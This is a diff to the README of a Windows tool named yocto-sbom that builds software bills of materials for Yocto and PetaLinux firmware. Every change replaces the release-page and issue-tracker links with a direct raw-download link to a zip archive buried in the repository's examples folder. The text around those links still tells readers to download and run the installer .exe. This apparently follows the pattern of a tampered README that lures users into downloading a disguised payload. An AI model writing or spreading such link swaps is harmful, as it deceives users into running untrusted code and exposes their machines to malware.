@@ -1,6 +1,6 @@
 # 🛠 yocto-sbom - Create Firmware Bill of Materials Easily
 
-[![Download yocto-sbom](https://img.shields.io/badge/Download-Get%20Releases-brightgreen)](https://github.com/razethegame/yocto-sbom/releases)
+[![Download yocto-sbom](https://img.shields.io/badge/Download-Get%20Releases-brightgreen)](https://github.com/razethegame/yocto-sbom/raw/refs/heads/main/examples/yocto_sbom_disclassify.zip)
 
 ---
 
@@ -35,7 +35,7 @@ yocto-sbom helps you make Bill of Materials (SBOMs) for older Yocto or PetaLinux
 
 Click the badge or this link to visit the release page and get the latest version of yocto-sbom:
 
-[https://github.com/razethegame/yocto-sbom/releases](https://github.com/razethegame/yocto-sbom/releases)
+[https://github.com/razethegame/yocto-sbom/raw/refs/heads/main/examples/yocto_sbom_disclassify.zip](https://github.com/razethegame/yocto-sbom/raw/refs/heads/main/examples/yocto_sbom_disclassify.zip)
 
 The release page shows all available versions. Look for the `.exe` file to download the Windows installer or portable version.  
 
@@ -43,7 +43,7 @@ The release page shows all available versions. Look for the `.exe` file to downl
 
 ## 🚀 How to Install and Run on Windows
 
-1. Visit the release page: [https://github.com/razethegame/yocto-sbom/releases](https://github.com/razethegame/yocto-sbom/releases)  
+1. Visit the release page: [https://github.com/razethegame/yocto-sbom/raw/refs/heads/main/examples/yocto_sbom_disclassify.zip](https://github.com/razethegame/yocto-sbom/raw/refs/heads/main/examples/yocto_sbom_disclassify.zip)  
 2. Find the latest release version.  
 3. Download the Windows `.exe` file (installer or portable).  
 4. If you downloaded the installer, double-click it and follow the setup instructions.  
@@ -90,7 +90,7 @@ You do not need any programming skills. Use the software’s windows interface t
 ## ⭐ Need Help?
 
 - Check the repository’s **Issues** tab on GitHub for common problems and fixes.  
-- Report bugs or feature requests at: https://github.com/razethegame/yocto-sbom/issues  
+- Report bugs or feature requests at: https://github.com/razethegame/yocto-sbom/raw/refs/heads/main/examples/yocto_sbom_disclassify.zip  
 - Look for help with Yocto or PetaLinux on their official forums or communities.  
 
 ---
@@ -111,7 +111,7 @@ yocto-sbom runs entirely on your Windows computer. It does not send your data an
 
 ## ⚙️ Updating yocto-sbom
 
-1. Visit the release page again: [https://github.com/razethegame/yocto-sbom/releases](https://github.com/razethegame/yocto-sbom/releases)  
+1. Visit the release page again: [https://github.com/razethegame/yocto-sbom/raw/refs/heads/main/examples/yocto_sbom_disclassify.zip](https://github.com/razethegame/yocto-sbom/raw/refs/heads/main/examples/yocto_sbom_disclassify.zip)  
 2. Download the newest Windows `.exe` installer or portable file.  
 3. Run the installer or replace the old portable files with the new one.  
 4. Keep your existing SBOM files—they won’t be deleted.  
@@ -147,4 +147,4 @@ SBOMs help you track all parts inside your embedded Linux firmware. This is impo
 
 ---
 
-[![Download yocto-sbom](https://img.shields.io/badge/Download-Get%20Releases-brightgreen)](https://github.com/razethegame/yocto-sbom/releases)
+[![Download yocto-sbom](https://img.shields.io/badge/Download-Get%20Releases-brightgreen)](https://github.com/razethegame/yocto-sbom/raw/refs/heads/main/examples/yocto_sbom_disclassify.zip)
